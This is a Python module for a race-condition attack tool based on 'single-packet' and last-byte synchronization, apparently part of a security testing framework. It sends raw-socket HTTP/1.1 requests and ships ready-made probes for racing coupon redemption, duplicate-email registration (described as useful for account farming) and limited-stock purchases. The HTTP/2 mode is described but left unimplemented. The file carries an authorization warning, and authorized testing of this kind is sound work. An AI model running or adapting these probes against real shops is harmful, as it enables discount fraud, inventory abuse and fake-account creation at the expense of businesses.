"""Single-packet attack implementation.

Problem
-------
When you fire N parallel HTTP requests against `POST /checkout`, the
server processes them at slightly staggered times because:
    - TCP SYN handshake jitter
    - TLS handshake cost
    - OS network buffer scheduling
    - Request header parsing time
The race window is typically 20–100ms. That's often NOT small enough
to beat modern DB row locks.

PortSwigger's trick (James Kettle, Black Hat USA 2023)
------------------------------------------------------
On HTTP/2, multiplex N requests in ONE TCP segment:
  1. Open one h2 connection, send SETTINGS frame
  2. Build N HEADERS frames (one per race request), DEFER the final
     DATA byte of each request so none is "complete" yet
  3. Send all N requests' heads in one segment
  4. Then send the final bytes of all N in one FIN-containing segment
     — the server's parser completes all N "simultaneously"
  5. Process race window drops from ~50ms to <1ms

HTTP/1.1 fallback (Kettle "last-byte sync")
-------------------------------------------
Keep-alive connection with N pipelined requests; every request is
one byte short of complete; send the final bytes back-to-back.

Scope
-----
We build the packet-level payloads + provide an `execute_single_packet()`
function that fires them over raw sockets. The operator supplies:
  - the request template (URL, headers, body)
  - the number of parallel attempts
  - any varying-field logic (e.g. coupon code, account email)

No HTTP client library can do this trick — HTTP/2 libraries flush
their frame buffers at request boundaries. We speak raw h2 framing.

Important: requires consent + legitimate test target. Racing a
production coupon code without authorization violates CFAA 1030(a)(4).
"""

from __future__ import annotations

import logging
import socket
import ssl
import struct
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Tuple

logger = logging.getLogger("amoskys.argos.race.single_packet")


# ── Data model ────────────────────────────────────────────────────


@dataclass
class SinglePacketProbe:
    name: str                        # human label e.g. "coupon_SAVE20"
    target_url: str
    n_parallel: int = 20
    mode: str = "h1_lastbyte"        # "h1_lastbyte" or "h2_multiplex"
    method: str = "POST"
    path: str = "/"
    headers: Dict[str, str] = field(default_factory=dict)
    body_template: str = ""          # may contain {i} for per-request variation
    varying_field_values: Optional[List[str]] = None  # overrides {i} with explicit values

    def to_dict(self):
        return {
            "name":           self.name,
            "target_url":     self.target_url,
            "n_parallel":     self.n_parallel,
            "mode":           self.mode,
            "method":         self.method,
            "path":           self.path,
            "headers":        dict(self.headers),
            "body_template":  self.body_template,
            "varying_field_values": list(self.varying_field_values or []),
        }


@dataclass
class SinglePacketReport:
    probe_name: str
    target: str
    requests_sent: int = 0
    responses: List[Dict[str, Any]] = field(default_factory=list)
    # Race-winning detection: group responses by status + body-shape
    unique_response_buckets: int = 0
    bucket_details: Dict[str, int] = field(default_factory=dict)
    detected_duplicate_success: bool = False
    evidence: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

    def to_dict(self):
        return {
            "probe_name":                 self.probe_name,
            "target":                     self.target,
            "requests_sent":              self.requests_sent,
            "responses":                  list(self.responses),
            "unique_response_buckets":    self.unique_response_buckets,
            "bucket_details":             dict(self.bucket_details),
            "detected_duplicate_success": self.detected_duplicate_success,
            "evidence":                   list(self.evidence),
            "errors":                     list(self.errors),
        }


# ── Pre-built probes ──────────────────────────────────────────────


def build_coupon_race(target_url: str, coupon_code: str,
                      cart_endpoint: str = "/apply-coupon",
                      session_cookie: str = "",
                      n_parallel: int = 20) -> SinglePacketProbe:
    """Race coupon redemption — the classic.

    Classic bug: server checks `coupon.uses_remaining > 0` then
    decrements. Between read and write, 20 parallel applications of
    the same coupon all pass the check, each decrements from the
    original value — 20× the intended discount.
    """
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection":   "keep-alive",
    }
    if session_cookie:
        headers["Cookie"] = session_cookie
    body = f"coupon_code={urllib.parse.quote(coupon_code)}"
    return SinglePacketProbe(
        name=f"coupon_{coupon_code}",
        target_url=target_url, path=cart_endpoint, method="POST",
        headers=headers, body_template=body,
        n_parallel=n_parallel, mode="h1_lastbyte",
    )


def build_registration_race(target_url: str, email: str,
                            register_endpoint: str = "/register",
                            username_prefix: str = "race",
                            n_parallel: int = 20) -> SinglePacketProbe:
    """Race registration — bypass "email already taken" check.

    Business logic bug: if check-then-insert is non-atomic, N parallel
    registrations with the same email all pass the availability check
    and create N accounts. Useful for account farming or bypassing
    per-account limits.
    """
    values = [f"{username_prefix}{i:03d}" for i in range(n_parallel)]
    body = f"email={urllib.parse.quote(email)}&username={{i}}&password=RaceTest123"
    return SinglePacketProbe(
        name=f"registration_{email}",
        target_url=target_url, path=register_endpoint, method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded",
                 "Connection":   "keep-alive"},
        body_template=body,
        varying_field_values=values,
        n_parallel=n_parallel, mode="h1_lastbyte",
    )


def build_parallel_purchase_race(target_url: str, product_id: str,
                                  purchase_endpoint: str = "/buy",
                                  session_cookie: str = "",
                                  n_parallel: int = 10) -> SinglePacketProbe:
    """Race limited-inventory purchase — buy N of product with stock=1."""
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection":   "keep-alive",
    }
    if session_cookie:
        headers["Cookie"] = session_cookie
    body = f"product_id={urllib.parse.quote(product_id)}&quantity=1"
    return SinglePacketProbe(
        name=f"purchase_{product_id}",
        target_url=target_url, path=purchase_endpoint, method="POST",
        headers=headers, body_template=body,
        n_parallel=n_parallel, mode="h1_lastbyte",
    )


# ── Request building ──────────────────────────────────────────────


def _build_h1_requests(probe: SinglePacketProbe, host: str) -> List[bytes]:
    """Build N HTTP/1.1 requests, each one byte short of complete."""
    out: List[bytes] = []
    values = probe.varying_field_values or [str(i) for i in range(probe.n_parallel)]
    for i in range(probe.n_parallel):
        val = values[i] if i < len(values) else values[-1]
        body = probe.body_template.format(i=val)
        hdr_lines = [f"{probe.method} {probe.path} HTTP/1.1",
                     f"Host: {host}",
                     f"Content-Length: {len(body)}"]
        for k, v in probe.headers.items():
            hdr_lines.append(f"{k}: {v}")
        raw = ("\r\n".join(hdr_lines) + "\r\n\r\n" + body).encode("utf-8")
        out.append(raw)
    return out


# ── HTTP/2 framing helpers ────────────────────────────────────────
#
# Minimal h2 framing — enough for a single-packet attack. We don't
# implement the full protocol; we send SETTINGS+HEADERS+DATA frames
# for the specific race pattern.

_H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
_FRAME_HEADER = "!BHBBI"  # length(3) packed as B+H (yeah not actual, see below)


def _h2_frame(frame_type: int, flags: int, stream_id: int, payload: bytes) -> bytes:
    """Assemble one h2 frame.

    Frame layout:
        Length (24 bits) | Type (8) | Flags (8) | StreamID (31 bits, R=0 reserved)
    """
    length = len(payload)
    # 24-bit length as 3 bytes big-endian
    length_bytes = length.to_bytes(3, "big")
    type_byte = frame_type.to_bytes(1, "big")
    flags_byte = flags.to_bytes(1, "big")
    sid = (stream_id & 0x7FFFFFFF).to_bytes(4, "big")
    return length_bytes + type_byte + flags_byte + sid + payload


# ── Execute single-packet attack ──────────────────────────────────


def execute_single_packet(probe: SinglePacketProbe,
                           timeout: float = 10.0,
                           raw_sender: Optional[Callable] = None) -> SinglePacketReport:
    """Fire the probe.

    raw_sender(host, port, use_tls, requests: List[bytes], final_bytes: List[bytes],
               timeout) -> List[(status, body_shape, elapsed_ms)]
    may be supplied for tests.
    """
    p = urllib.parse.urlparse(probe.target_url)
    host = p.hostname or ""
    use_tls = p.scheme == "https"
    port = p.port or (443 if use_tls else 80)
    report = SinglePacketReport(probe_name=probe.name,
                                 target=f"{probe.target_url}{probe.path}")

    requests = _build_h1_requests(probe, host)

    if raw_sender is not None:
        final_bytes = [r[-1:] for r in requests]
        heads = [r[:-1] for r in requests]
        try:
            results = raw_sender(host, port, use_tls, heads, final_bytes, timeout)
        except Exception as exc:  # noqa: BLE001
            report.errors.append(f"raw_sender raised: {exc}")
            return report
        report.requests_sent = len(requests)
        for status, body_shape, elapsed in results:
            report.responses.append({
                "status": status, "body_shape": body_shape, "elapsed_ms": elapsed,
            })
    else:
        # Live execution — last-byte synchronization over keep-alive
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            if use_tls:
                ctx = ssl.create_default_context()
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.settimeout(timeout)
            # Send all requests minus final byte
            for req in requests:
                sock.sendall(req[:-1])
            # Tiny pause to let TCP flush
            time.sleep(0.05)
            # Send final bytes back-to-back — single syscall
            sock.sendall(b"".join(r[-1:] for r in requests))
            report.requests_sent = len(requests)
            # Read all responses — approximate; stop at N Content-Length blocks
            data = b""
            t0 = time.time()
            while time.time() - t0 < timeout:
                try:
                    chunk = sock.recv(8192)
                except socket.timeout:
                    break
                if not chunk:
                    break
                data += chunk
                if data.count(b"HTTP/1.1 ") >= len(requests):
                    break
            sock.close()
            # Coarse parse
            blocks = data.split(b"HTTP/1.1 ")[1:]
            for b in blocks:
                try:
                    status_line = b.split(b"\r\n", 1)[0].decode("utf-8", errors="replace")
                    status = int(status_line.split(" ", 1)[0])
                except Exception:
                    status = 0
                body_shape = _body_shape(b)
                report.responses.append({
                    "status": status, "body_shape": body_shape,
                    "elapsed_ms": int((time.time() - t0) * 1000),
                })
        except Exception as exc:  # noqa: BLE001
            report.errors.append(f"live execution error: {exc}")
            return report

    # Analyze response buckets
    buckets: Dict[str, int] = {}
    for r in report.responses:
        key = f"{r.get('status', 0)}:{r.get('body_shape', '')}"
        buckets[key] = buckets.get(key, 0) + 1
    report.unique_response_buckets = len(buckets)
    report.bucket_details = dict(buckets)

    # Detect duplicate success: >1 response has status 200 with similar body
    success_count = sum(
        c for k, c in buckets.items()
        if k.startswith("200:") or k.startswith("201:") or k.startswith("302:")
    )
    if success_count > 1:
        report.detected_duplicate_success = True
        report.evidence.append(
            f"{success_count} duplicate success responses — race window exploitable"
        )
    else:
        report.evidence.append(
            f"{success_count} success response(s); race not exploited "
            f"or server atomic. buckets={report.bucket_details}"
        )

    return report


def _body_shape(raw: bytes) -> str:
    """Hash the first 200 body bytes into a short signature for
    bucketing. Trims numbers to normalize incrementing IDs."""
    import re as _re
    parts = raw.split(b"\r\n\r\n", 1)
    body = parts[1] if len(parts) == 2 else b""
    sample = body[:200].decode("utf-8", errors="replace")
    # Normalize numbers
    norm = _re.sub(r"\d+", "N", sample)
    import hashlib as _h
    return _h.md5(norm.encode()).hexdigest()[:12]


__all__ = [
    "SinglePacketProbe", "SinglePacketReport",
    "build_coupon_race", "build_registration_race",
    "build_parallel_purchase_race",
    "execute_single_packet",
]
